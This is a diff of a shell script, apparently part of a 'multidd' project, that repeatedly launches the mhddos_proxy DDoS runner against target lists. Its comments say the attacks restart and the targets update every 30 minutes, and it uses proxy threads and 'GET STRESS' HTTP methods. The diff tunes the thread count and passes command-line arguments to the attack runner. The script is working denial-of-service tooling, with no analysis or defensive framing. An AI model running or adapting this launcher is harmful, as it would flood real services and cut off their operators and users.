@@ -23,6 +23,8 @@ typing_on_screen (){
 }
 export -f typing_on_screen
 
+all_args="${@}"
+
 #if launched in docker than variables saved in docker md.sh will be used
 if [[ $docker_mode != "true" ]]; then
     gotop="on"
@@ -39,7 +41,7 @@ if [[ $t_set_manual != "on" ]]; then
 fi
 
 if [[ $t_proxy_manual != "on" ]]; then
-    export proxy_threads="4000"
+    export proxy_threads="2000"
 fi
 
 export methods="--http-methods GET STRESS"
@@ -214,9 +216,9 @@ fi
 # Restart attacks and update targets every 30 minutes
 while true; do
         pkill -f start.py; pkill -f runner.py 
-        python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $threads $methods&
-        sleep 10 # to decrease load on cpu during simultaneous start
-        python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
+        python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $all_args& #$threads $methods&
+        # sleep 10 # to decrease load on cpu during simultaneous start
+        # python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
         # python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
